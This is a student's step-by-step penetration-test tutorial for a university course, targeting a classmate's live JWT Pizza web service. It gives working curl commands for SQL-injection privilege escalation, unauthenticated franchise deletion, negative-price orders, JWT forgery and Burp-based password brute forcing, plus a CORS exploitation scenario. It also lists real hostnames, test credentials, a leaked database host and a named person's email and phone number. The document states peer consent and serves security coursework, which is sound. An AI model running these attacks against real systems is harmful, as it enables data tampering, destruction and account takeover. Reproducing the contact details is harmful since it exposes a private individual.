# Peer Penetration Test Tutorial: Attacking Marco's JWT Pizza

> **Target:** Marco Sotomarino's JWT Pizza deployment
> **Authorization:** This test is conducted as part of BYU CS 329 with peer consent.
> **Peer contact:** marco97@byu.edu / 801-651-1440
> **Last recon:** April 13, 2026

---

## Before You Begin

**Ground rules for attacking a peer's system:**

1. You have explicit permission to test Marco's deployment as part of the CS 329 deliverable. This does NOT extend to any other systems.
2. Avoid destructive operations whenever possible. If you must test a destructive endpoint, create your own test data first and delete that.
3. Document everything — screenshots, terminal output, HTTP responses. Even failed attacks are valuable evidence.
4. If you accidentally break something, contact Marco immediately.

**Tools you will need:**

- `curl` (command line HTTP client)
- A web browser with developer tools
- `node` (Node.js — for JWT manipulation, run from `jwt-pizza-service/` directory which has `jsonwebtoken` installed)
- **Burp Suite Community Edition** (free — download from https://portswigger.net/burp/communitydownload)
- A screenshot tool

**Endpoints:**

| Component      | URL                                       |
| -------------- | ----------------------------------------- |
| Frontend       | https://pizza.marcosotomarino.com         |
| Backend API    | https://pizza-service.marcosotomarino.com |
| Pizza Factory  | https://pizza-factory.cs329.click         |

---

## Phase 1: Verify Your Recon (5 minutes)

Before you fire a single attack, confirm that the intelligence from recon is still valid.

### Step 1.1: Confirm the API is alive

```bash
curl -s https://pizza-service.marcosotomarino.com/
```

Expected: `{"message":"welcome to JWT Pizza","version":"00010101.010101"}`

### Step 1.2: Log in as pentest2

We have a registered account on Marco's system.

```bash
curl -s -X PUT https://pizza-service.marcosotomarino.com/api/auth \
  -H "Content-Type: application/json" \
  -d '{"email":"pentest2@test.com","password":"pentest123"}'
```

Save the token:

```bash
export TOKEN="<paste the token from the response>"
```

If the account was deleted, register a fresh one:

```bash
curl -s -X POST https://pizza-service.marcosotomarino.com/api/auth \
  -H "Content-Type: application/json" \
  -d '{"name":"pentest3","email":"pentest3@test.com","password":"pentest123"}'
```

**Note your user ID from the response — you'll need it for attack commands.**

### Step 1.3: Confirm menu and franchises

```bash
# Menu
curl -s https://pizza-service.marcosotomarino.com/api/order/menu

# Franchises (public endpoint, no auth needed)
curl -s https://pizza-service.marcosotomarino.com/api/franchise
```

As of April 13 recon:
- **Menu:** 5 items (IDs 2-6): Veggie, Margarita, Crusty, Charred Leopard, Pepperoni
- **Franchises:** "My Pizza Franchise" (ID 1, has store "Main Store" ID 1), "SLC" (ID 2, no stores)

Use **menuId 2** (Veggie, $0.0038) for order attacks. Use **franchise ID 2** ("SLC", no stores) if you need a safe deletion target.

### Step 1.4: Decode your token

```bash
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null
```

Confirm: your `id`, `roles` (should be `diner`), and check for `exp` claim. Recon confirmed tokens have NO `exp` — they never expire.

**If all checks pass, you have a confirmed foothold. Time to attack.**

---

## Phase 2: The Attacks

You need at least 5 attacks for the deliverable. Below are 7 attacks covering 5 different OWASP categories. All have been confirmed vulnerable as of April 13, 2026.

---

### Attack 1: SQL Injection — Privilege Escalation (A03 Injection)

**CONFIRMED VULNERABLE** — tested April 13, 2026.

**What happens:** The `PUT /api/user/:userId` endpoint uses string concatenation to build SQL. Injecting `admin'-- ` in the name field comments out the WHERE clause, causing the UPDATE to hit user ID 1 instead of your user. The server returns a JWT for user ID 1 — privilege escalation.

**WARNING:** This modifies the database. The injection without a WHERE clause affects ALL rows' `name` column. Be prepared to explain this to Marco.

#### Step-by-step

**1a. Send the SQL injection payload:**

```bash
curl -s -X PUT "https://pizza-service.marcosotomarino.com/api/user/<YOUR_USER_ID>" \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"email":"test@test.com","name":"admin'\''-- "}'
```

Replace `<YOUR_USER_ID>` with your user ID (e.g., 17).

**What to look for:** The response returns a JWT with `"id": 1` — a DIFFERENT user than you authenticated as. This proves the SQL injection worked and you modified another user's record.

Example response (from April 13 testing):
```json
{
  "user": {
    "id": 1,
    "name": "admin",
    "email": "test@test.com",
    "roles": [{"role": "diner"}]
  },
  "token": "eyJhbG..."
}
```

**1b. Show SQL structure via error-based injection:**

```bash
curl -s -X PUT "https://pizza-service.marcosotomarino.com/api/user/<YOUR_USER_ID>" \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"email":"x'\'' UNION SELECT id,name,email,password FROM user WHERE '\''1'\''='\''1","password":"test"}'
```

This will return an error message that reveals the SQL query structure, table name (`user`), column names, and file paths.

**1c. Clean up after yourself:**

```bash
curl -s -X PUT "https://pizza-service.marcosotomarino.com/api/user/<YOUR_USER_ID>" \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"email":"pentest2@test.com","name":"pentest2","password":"pentest123"}'
```

**Record this as:** Severity 4 (Critical). OWASP A03 Injection. The attacker can modify any user's record and receive their JWT.

---

### Attack 2: Unauthenticated Franchise Deletion (A01 Broken Access Control)

**CONFIRMED VULNERABLE** — tested April 13, 2026.

**What happens:** The `DELETE /api/franchise/:franchiseId` endpoint has NO authentication middleware. Anyone on the internet can delete any franchise without logging in.

#### Step-by-step

**2a. First, note the current franchises:**

```bash
curl -s https://pizza-service.marcosotomarino.com/api/franchise
```

**2b. Delete an empty franchise with NO auth header:**

Pick a franchise with no stores (e.g., "SLC" ID 2). Do NOT delete franchise ID 1 — it has a store.

```bash
curl -s -X DELETE https://pizza-service.marcosotomarino.com/api/franchise/2 \
  -w "\nHTTP_CODE: %{http_code}"
```

Expected: `{"message":"franchise deleted"}` with HTTP 200. No login, no token, nothing.

**2c. Verify it's gone:**

```bash
curl -s https://pizza-service.marcosotomarino.com/api/franchise
```

**Note:** You can't recreate the franchise without admin access. Let Marco know so he can restore it.

**Record this as:** Severity 4 (Critical). OWASP A01 Broken Access Control. Any anonymous user can destroy business data.

---

### Attack 3: Free Pizza — Client-Side Price Manipulation (A04 Insecure Design)

**CONFIRMED VULNERABLE** — tested April 13, 2026. Both zero and negative prices accepted.

**What happens:** The server trusts the `price` field from the client without validating against the menu database. You can order pizza for free or even for a negative price.

#### Step-by-step

**3a. Check the real menu prices:**

```bash
curl -s https://pizza-service.marcosotomarino.com/api/order/menu
```

Note: Veggie (menuId 2) costs $0.0038.

**3b. Order at a manipulated price:**

```bash
curl -s -X POST https://pizza-service.marcosotomarino.com/api/order \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"franchiseId":1,"storeId":1,"items":[{"menuId":2,"description":"Veggie","price":0.0001}]}'
```

Expected: Order accepted at the fraudulent price. The pizza factory even issues a valid signed JWT for the order.

**3c. (Optional) Try a negative price:**

```bash
curl -s -X POST https://pizza-service.marcosotomarino.com/api/order \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"franchiseId":1,"storeId":1,"items":[{"menuId":2,"description":"Veggie","price":-100}]}'
```

This also works — the server accepts negative prices. In a real system, this could credit money to the attacker.

**Record this as:** Severity 3 (High). OWASP A04 Insecure Design. Unlimited free (or negative-price) pizza.

---

### Attack 4: Information Disclosure & Security Misconfiguration (A05)

**CONFIRMED VULNERABLE** — all findings confirmed April 13, 2026.

**What happens:** Multiple misconfiguration issues leak internal architecture details.

#### Step-by-step

**4a. Leaked database hostname in /api/docs:**

```bash
curl -s https://pizza-service.marcosotomarino.com/api/docs | grep -o '"db":"[^"]*"'
```

Expected: `"db":"jwt-pizza-db.csdC8skiue7b.us-east-1.rds.amazonaws.com"`

This reveals the AWS RDS instance name, region (us-east-1), and specific identifier.

**4b. Stack trace leakage — send malformed JSON:**

```bash
curl -s -X PUT https://pizza-service.marcosotomarino.com/api/auth \
  -H 'Content-Type: application/json' \
  -d 'not json'
```

Expected: Full stack trace revealing `/app/node_modules/body-parser/...`, Node.js runtime version, internal file paths.

**4c. Stack trace on auth failure:**

```bash
curl -s -X PUT https://pizza-service.marcosotomarino.com/api/auth \
  -H 'Content-Type: application/json' \
  -d '{"email":"doesnotexist@nowhere.com","password":"anything"}'
```

Expected: Stack trace revealing `/app/src/database/database.js:107` and `/app/src/routes/authRouter.js:110`.

**4d. X-Powered-By and missing security headers:**

```bash
curl -sI https://pizza-service.marcosotomarino.com/
```

Look for:
- `X-Powered-By: Express` — should be removed
- **Missing:** `Content-Security-Policy`, `Strict-Transport-Security`, `X-Frame-Options`, `X-Content-Type-Options`

**4e. CORS origin reflection:**

```bash
curl -sI https://pizza-service.marcosotomarino.com/api/franchise \
  -H "Origin: https://evil-attacker.com"
```

Expected:
```
access-control-allow-origin: https://evil-attacker.com
access-control-allow-credentials: true
```

Any malicious website can make authenticated cross-origin requests.

**Record this as:** Severity 2 (Medium). OWASP A05 Security Misconfiguration. Multiple information leaks that aid further attacks.

---

### Attack 5: JWT Forgery Attempt (A02 Cryptographic Failures)

**CONFIRMED: Forgery FAILS** — Marco changed the JWT secret. However, the lack of token expiry is still a cryptographic failure.

**What happens:** The source code `.env` has `JWT_SECRET=dev-secret-key-change-in-production`. We try to forge an admin JWT with this secret. If it fails, we document the missing `exp` claim instead.

#### Step-by-step

**5a. Forge an admin JWT (run from jwt-pizza-service directory):**

```bash
cd /path/to/jwt-pizza-service
FORGED=$(node -e "
  const jwt = require('jsonwebtoken');
  const token = jwt.sign(
    {id: 17, name: 'pentest2', email: 'pentest2@test.com', roles: [{role: 'admin'}]},
    'dev-secret-key-change-in-production'
  );
  console.log(token);
")
echo "Forged token: $FORGED"
```

**5b. Test the forged token:**

```bash
curl -s https://pizza-service.marcosotomarino.com/api/order \
  -H "Authorization: Bearer $FORGED"
```

Expected: `{"message":"unauthorized"}` — Marco changed the secret. Document this as a severity 0 (unsuccessful) for the forgery itself.

**5c. Document the missing expiry as a separate finding:**

```bash
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null
```

Note there is NO `exp` claim — only `iat`. Tokens never expire. A stolen token is valid forever.

**Record this as:** Severity 0 for the forgery attempt (blocked). Severity 2 for the missing expiry (separate finding or note). OWASP A02 Cryptographic Failures.

---

### Attack 6: Brute Force — No Rate Limiting (A07 Authentication Failures)

**Use Burp Suite for this attack** — the course requires the Burp Suite prerequisite exercise.

#### Step-by-step with Burp Suite

**6a. Open Burp Suite and launch the proxy browser:**

1. Open Burp Suite Community Edition
2. Create a **Temporary project** > **Start Burp** with defaults
3. Click the **Proxy** tab > **Open browser**

**6b. Capture a login request:**

1. In the Burp browser, navigate to `https://pizza.marcosotomarino.com`
2. Click Login, enter any email/password, submit
3. In Burp, click **Proxy > HTTP history**
4. Find the `PUT /api/auth` request — right-click it > **Send to Intruder**

**6c. Configure the Intruder attack:**

1. Click the **Intruder** tab
2. In **Payload positions**, find the password value in the request body
3. Highlight just the password value and click **Add §** so it looks like:
   ```
   {"email":"pentest2@test.com","password":"§test§"}
   ```
4. Click the **Payloads** tab
5. Add candidate passwords one by one using the **Add** input:
   - `admin`, `password`, `123456`, `test`, `pizza`, `pentest123`, `secret`, `franchisee`, `diner`, `changeme`, `qwerty`, `letmein`
6. Click **Start attack** (dismiss the Community Edition throttle warning)

**6d. Analyze results:**

- Look at the **Status** and **Length** columns
- A `200` status code = successful login
- `pentest123` should return 200 (our known password)
- All others should return 404

**Key finding:** There is no rate limiting, no CAPTCHA, no account lockout. An attacker can try unlimited passwords. Take a screenshot of the Intruder results window.

**Record this as:** Severity 2 (Medium). OWASP A07 Identification and Authentication Failures. No brute force protection on login endpoint.

---

### Attack 7 (Bonus): CORS Cross-Origin Exploitation (A05)

If you want a standalone CORS attack record (separate from Attack 4), you can demonstrate a full exploitation scenario.

#### Step-by-step

**7a. Show the CORS reflection:**

```bash
curl -sI https://pizza-service.marcosotomarino.com/api/franchise \
  -H "Origin: https://evil-attacker.com"
```

Note: `access-control-allow-origin: https://evil-attacker.com` with `access-control-allow-credentials: true`.

**7b. Explain the attack scenario:**

A malicious website at `https://evil-attacker.com` could include JavaScript that:
1. Makes a `fetch()` to `https://pizza-service.marcosotomarino.com/api/order` with `credentials: 'include'`
2. The browser sends the victim's auth cookie/token along with the request
3. The server reflects the malicious origin, so the browser allows the response to be read
4. The attacker's JavaScript now has the victim's order data, user info, or can perform actions on their behalf

**Record this as:** Severity 3 (High). OWASP A05 Security Misconfiguration.

---

## Phase 3: Write Your Attack Records

For each attack, use this table format:

```markdown
| Item           | Result                                                        |
| -------------- | ------------------------------------------------------------- |
| Date           | [date you ran the attack]                                     |
| Target         | pizza-service.marcosotomarino.com                             |
| Classification | [OWASP category]                                              |
| Severity       | [0-4]                                                         |
| Description    | [What you did, what happened, why it matters]                 |
| Images         | See below                                                     |
| Corrections    | [What code change would fix this]                             |
```

Follow each table with the actual curl commands and responses as code blocks (this IS your evidence/images).

Save your attack records to:
`/Users/jayellis/dev/byu/cs329/jwt-pizza/penetrationTests/peerAttackRecords.md`

---

## Phase 4: Combine Into Final Report

After completing your attacks, merge everything into `peerTest.md`:

1. Both peers' names (Jay Ellis + Marco Sotomarino)
2. Self attack records (from `selfAttackRecords.md` — already done, 7 attacks)
3. Peer attack records (your attacks on Marco + Marco's attacks on you)
4. Combined summary of learnings
5. Star rating for Marco (log into Pizza Factory to submit)

---

## Quick Reference: Confirmed Vulnerability Status (April 13)

| Vulnerability                   | Status         | Attack # |
| ------------------------------- | -------------- | -------- |
| SQL injection (user update)     | **VULNERABLE** | 1        |
| Unauth franchise deletion       | **VULNERABLE** | 2        |
| Price manipulation (free pizza) | **VULNERABLE** | 3        |
| Stack trace / info disclosure   | **VULNERABLE** | 4        |
| CORS origin reflection          | **VULNERABLE** | 4, 7     |
| DB host in /api/docs            | **VULNERABLE** | 4        |
| Missing security headers        | **VULNERABLE** | 4        |
| JWT forgery (default secret)    | **PATCHED**    | 5        |
| No JWT expiry                   | **VULNERABLE** | 5        |
| No rate limiting                | **VULNERABLE** | 6        |
| Default admin credentials       | **PATCHED**    | N/A      |

## Quick Reference: Key Values

| Item                     | Value                                                    |
| ------------------------ | -------------------------------------------------------- |
| Test account email       | pentest2@test.com                                        |
| Test account pass        | pentest123                                               |
| Test account user ID     | 17                                                       |
| Menu ID for orders       | 2 (Veggie, $0.0038)                                     |
| Safe franchise to delete | ID 2 ("SLC", no stores)                                 |
| DB host (leaked)         | jwt-pizza-db.csdC8skiue7b.us-east-1.rds.amazonaws.com   |
| JWT secret (default)     | dev-secret-key-change-in-production (REJECTED by server) |
